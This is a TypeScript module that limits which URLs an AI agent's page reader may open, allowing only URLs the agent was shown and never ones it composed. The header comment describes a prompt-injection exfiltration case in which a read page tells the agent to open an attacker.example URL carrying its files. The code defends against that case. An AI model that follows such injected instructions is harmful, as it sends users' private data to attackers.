// Which pages a workspace may ask the page reader to open. A page reader is a way out of a workspace: a page an agent
// reads can tell it to "open https://attacker.example/?d=<your files>", and the request itself would carry the data
// out. So an agent may open a URL that was shown to it (in a search result, on a page it read, or in its
// conversation: the user's messages and the output of its tools), but not one it composed itself. A short list of
// documentation and code sites is open as a whole, because nobody but their operators sees what is requested from
// them. READER_URL_POLICY=any turns the rule off (every public page can be read).
import { parseJson } from "../lib/json.ts";

/** Longer URLs are not read (the reader refuses them too), so they are not remembered either. */
export const MAX_URL_CHARS = 2000;

const URL_PATTERN = /https?:\/\/[^\s<>"'`\\^{}|\u0000-\u001f\u007f]+/gi;
const TRAILING_PUNCTUATION = ".,;:!?*'\"";
const MAX_URLS_PER_TEXT = 4000;

/** Every http(s) URL in a piece of text, without the punctuation that follows it. */
export function extractUrls(text: string): string[] {
  const urls: string[] = [];
  if (!text.includes("http")) return urls;
  for (const match of text.matchAll(URL_PATTERN)) {
    if (match[0].length > MAX_URL_CHARS + 64) continue;
    const url = trimUrl(match[0]);
    if (url.length > "https://".length && url.length <= MAX_URL_CHARS) urls.push(url);
    if (urls.length >= MAX_URLS_PER_TEXT) break;
  }
  return urls;
}

/**
 * Sentence punctuation and unbalanced closing brackets (markdown links, prose) are not part of a
 * URL. One pass to count the brackets, one from the end: this runs on text a page or a workspace
 * chose, so it must not cost more than the text is long.
 */
function trimUrl(url: string): string {
  let round = 0; // "(" minus ")"
  let square = 0;
  for (let index = 0; index < url.length; index++) {
    const code = url.charCodeAt(index);
    if (code === 40) round++;
    else if (code === 41) round--;
    else if (code === 91) square++;
    else if (code === 93) square--;
  }
  let end = url.length;
  while (end > 0) {
    const last = url[end - 1]!;
    if (TRAILING_PUNCTUATION.includes(last)) end--;
    else if (last === ")" && round < 0) (round++, end--);
    else if (last === "]" && square < 0) (square++, end--);
    else break;
  }
  return url.slice(0, end);
}

/**
 * The one spelling of a URL that the gateway checks and that the reader is asked for: parsed and
 * written out again (so "/a/../b", "%2e%2e" and odd host spellings are already resolved), host in
 * ASCII, no fragment. Null for anything that is not a plain http(s) URL.
 *
 * The check and the request must use the same string. If the gateway compared one reading of a
 * URL and the reader fetched another, a model could pass the check with a URL it was shown and
 * still have a path of its own choosing sent to that site.
 */
export function canonicalUrl(raw: string): string | null {
  if (raw.length > MAX_URL_CHARS * 2) return null;
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    return null;
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") return null;
  if (url.username !== "" || url.password !== "") return null;
  if (url.hostname.endsWith(".")) url.hostname = url.hostname.replace(/\.+$/, "");
  if (url.hostname === "") return null;
  url.hash = "";
  const href = url.href;
  return href.length > MAX_URL_CHARS ? null : href;
}

/**
 * The spellings under which a canonical URL may have been shown: itself, the other scheme, and
 * with or without one trailing slash. Models change these all the time ("http://example.com/docs/"
 * for "https://example.com/docs"), and none of them lets a model choose what is sent: the request
 * goes out in the spelling that was shown.
 */
function spellings(canonical: string): string[] {
  const url = new URL(canonical);
  const forms = [canonical];
  const slashed = new URL(canonical);
  if (slashed.pathname.length > 1 && slashed.pathname.endsWith("/")) slashed.pathname = slashed.pathname.slice(0, -1);
  else if (!slashed.pathname.endsWith("/")) slashed.pathname += "/";
  if (slashed.href !== canonical) forms.push(slashed.href);
  if (url.port === "") {
    for (const form of [...forms]) {
      const other = new URL(form);
      other.protocol = url.protocol === "https:" ? "http:" : "https:";
      forms.push(other.href);
    }
  }
  return forms;
}

/** The host of a URL, lower case and in ASCII; null when it is not a plain http(s) URL. */
export function urlHost(raw: string): string | null {
  const canonical = canonicalUrl(raw);
  return canonical === null ? null : new URL(canonical).hostname;
}

/** True when `host` is one of `trusted` or a subdomain of one. */
export function hostTrusted(host: string, trusted: readonly string[]): boolean {
  return trusted.some((entry) => host === entry || host.endsWith(`.${entry}`));
}

export interface ShownLimits {
  /** URLs remembered per workspace; the oldest go first. */
  urlsPerUser?: number;
  /** Characters of URLs remembered per workspace. */
  charsPerUser?: number;
  /** Workspaces remembered; the one unused for longest goes first (its next LLM request shows it its conversation again). */
  users?: number;
}

/** The URLs each workspace has been shown. Bounded in every direction: what goes in is chosen by pages and workspaces. */
export class ShownUrls {
  readonly #byUser = new Map<number, { urls: Set<string>; chars: number }>();
  readonly #urlsPerUser: number;
  readonly #charsPerUser: number;
  readonly #users: number;

  constructor(limits: ShownLimits = {}) {
    this.#urlsPerUser = limits.urlsPerUser ?? 20_000;
    this.#charsPerUser = limits.charsPerUser ?? 2_000_000;
    this.#users = limits.users ?? 64;
  }

  add(userId: number, urls: Iterable<string>): void {
    const entry = this.#touch(userId) ?? { urls: new Set<string>(), chars: 0 };
    this.#byUser.set(userId, entry);
    for (const url of urls) {
      const canonical = canonicalUrl(url);
      if (canonical === null) continue;
      if (entry.urls.delete(canonical)) entry.chars -= canonical.length; // adding again makes it the newest
      entry.urls.add(canonical);
      entry.chars += canonical.length;
    }
    for (const oldest of entry.urls) {
      if (entry.urls.size <= this.#urlsPerUser && entry.chars <= this.#charsPerUser) break;
      entry.urls.delete(oldest);
      entry.chars -= oldest.length;
    }
    for (const idle of this.#byUser.keys()) {
      if (this.#byUser.size <= this.#users) break;
      if (idle !== userId) this.#byUser.delete(idle);
    }
  }

  /** The URL to request for `url` when the workspace was shown that page: the spelling it was shown. Null otherwise. */
  find(userId: number, url: string): string | null {
    const canonical = canonicalUrl(url);
    const entry = canonical === null ? undefined : this.#touch(userId);
    if (canonical === null || !entry) return null;
    return spellings(canonical).find((form) => entry.urls.has(form)) ?? null;
  }

  has(userId: number, url: string): boolean {
    return this.find(userId, url) !== null;
  }

  forget(userId: number): void {
    this.#byUser.delete(userId);
  }

  /** The workspace's entry, moved to the recently used end. */
  #touch(userId: number): { urls: Set<string>; chars: number } | undefined {
    const entry = this.#byUser.get(userId);
    if (entry) {
      this.#byUser.delete(userId);
      this.#byUser.set(userId, entry);
    }
    return entry;
  }
}

/**
 * The URLs a chat or completion request shows the model: everything in it that the model did not
 * write itself (system, user and tool messages, and a bare prompt). Assistant messages are left out
 * on purpose: a URL the model composed must not become one it "was shown" on the next turn.
 */
export function urlsShownInLlmRequest(body: Buffer | string): string[] {
  const data = parseJson(typeof body === "string" ? body : body.toString("utf8"));
  if (data === null || typeof data !== "object") return [];
  const urls: string[] = [];
  const scan = (text: unknown): void => {
    if (typeof text === "string") urls.push(...extractUrls(text));
  };
  const { messages, prompt } = data as { messages?: unknown; prompt?: unknown };
  if (Array.isArray(messages)) {
    for (const message of messages) {
      if (message === null || typeof message !== "object") continue;
      const { role, content } = message as { role?: unknown; content?: unknown };
      if (role === "assistant") continue;
      if (Array.isArray(content)) for (const part of content) scan((part as { text?: unknown } | null)?.text);
      else scan(content);
    }
  }
  if (Array.isArray(prompt)) prompt.forEach(scan);
  else scan(prompt);
  return urls;
}
